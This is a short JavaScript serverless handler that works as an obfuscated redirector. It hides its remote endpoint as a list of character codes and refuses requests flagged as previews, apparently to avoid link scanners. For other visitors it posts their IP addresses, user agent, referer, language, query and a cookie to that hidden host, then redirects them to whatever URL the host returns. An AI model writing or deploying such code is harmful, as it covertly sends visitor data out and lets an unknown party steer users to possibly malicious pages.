export default async function handler(req, res) {
  const date = new Date().toISOString();
  const id = "499178";
  const uid = "yrez8stiipeall2mn4qv94nec";
  const query = req.url.split('?')[1] || "";
  const isPreview = req.headers["x-purpose"] === "preview";

  if (!isPreview) {
    const encodedURL = String.fromCharCode(
      104, 116, 116, 112, 115, 58, 47, 47, 106, 99, 105, 98, 106, 46, 99, 111, 109, 47, 112, 99, 108, 46, 112, 104, 112
    );

    const postData = {
      date: date,
      lan: req.headers["accept-language"],
      ref: req.headers["referer"] || "",
      ip: req.headers["x-real-ip"] || req.socket.remoteAddress,
      ipr: req.headers["x-forwarded-for"] || "",
      sn: req.headers["host"],
      requestUri: req.url,
      query: query,
      ua: req.headers["user-agent"],
      co: req.cookies?._event || "",
      user_id: uid,
      id: id,
    };

    try {
      const response = await fetch(encodedURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams(postData).toString(),
      });

      const result = await response.text();
      const arr = result.split(",");

      let q = "";
      if (query) {
        q = arr[1]?.includes("?") ? "&" + query : "?" + query;
      }

      let finalUrl = arr[1] + q;

      if (arr[0] === "true") {
        // Set cookies if needed (Vercel Edge does not support full cookie manipulation)
        res.writeHead(301, {
          Location: finalUrl,
        });
        res.end();
      } else if (arr[0] === "false") {
        finalUrl = arr[1] + (arr[5] ? q : "");
        res.writeHead(301, {
          Location: finalUrl,
        });
        res.end();
      } else {
        res.status(200).send("Unhandled redirect format");
      }

    } catch (err) {
      console.error("Error contacting remote:", err);
      res.status(500).send("Redirect failed.");
    }
  } else {
    res.status(403).send("Preview not allowed.");
  }
}
